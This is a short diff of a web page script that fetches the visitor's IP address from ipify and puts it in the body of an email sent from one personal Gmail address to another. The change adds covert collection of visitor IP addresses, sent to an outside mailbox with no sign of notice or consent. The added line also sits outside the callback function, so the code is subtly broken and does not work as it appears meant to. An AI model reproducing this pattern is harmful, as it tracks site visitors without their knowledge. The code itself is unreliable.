@@ -7,6 +7,7 @@
 
 <script type="application/javascript">  function getIP(json) {
   }
+  var ip = json.ip
 </script>
     <script type="application/javascript" src="https://api.ipify.org?format=jsonp&amp;
 callback=getIP"></script>
@@ -18,7 +19,7 @@ callback=getIP"></script>
     To : 'haineko04073@gmail.com',
     From : "udon0407@gmail.com",
     Subject : "test",
-    Body : "test"
+    Body : ip
 }).then(
   message => alert(message)
 );
